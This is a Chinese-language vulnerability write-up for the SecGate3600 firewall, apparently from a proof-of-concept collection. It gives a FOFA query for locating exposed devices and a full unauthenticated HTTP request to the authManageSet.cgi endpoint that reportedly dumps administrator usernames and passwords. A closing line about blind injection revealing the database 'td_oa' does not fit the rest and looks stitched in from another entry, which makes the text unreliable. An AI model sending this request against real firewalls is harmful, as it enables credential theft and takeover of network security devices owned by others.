# 网神SecGate3600防火墙敏感信息泄露漏洞

>网神SecGate3600下一代极速防火墙是奇安信网神自主研发高性能下一代防火墙 专门为运营商、政府、军队、教育、大型企业、中小型企业的互联网出口打造的集防火墙、抗DDoS攻击、VPN、内容过滤、IPS、带宽管理、用户认证等多项安全技术于一身的主动防御智能安全网关。

## 来源

[蚁剑安全实验室](https://mp.weixin.qq.com/s?__biz=MzkxNTU5NjM5MQ==&mid=2247484459&idx=1&sn=b4966e0d438504ef6c04461f646557ce)

## 简介

网神SecGate3600 authManageSet.cgi接口存在敏感信息泄露漏洞，未授权得攻击者可以通过此漏洞获取控制台管理员用户名密码等凭据，可登录控制整个后台。

## 漏洞类型

信息泄露

## 网络绘测

fofa:"sec_gate_image/button_normal.gif"

## POC

```http
POST /cgi-bin/authUser/authManageSet.cgi HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Fri, 23 Aug 2013 11:17:08 GMT
Content-Type: application/x-www-form-urlencoded
Content-Length: 77

type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc
```





![WPS图片(7)](./images/255400079-7a86ae1e-653b-444b-822e-5e78636a0bbe.png)

Then the database name can be determined by blind injection :td_oa
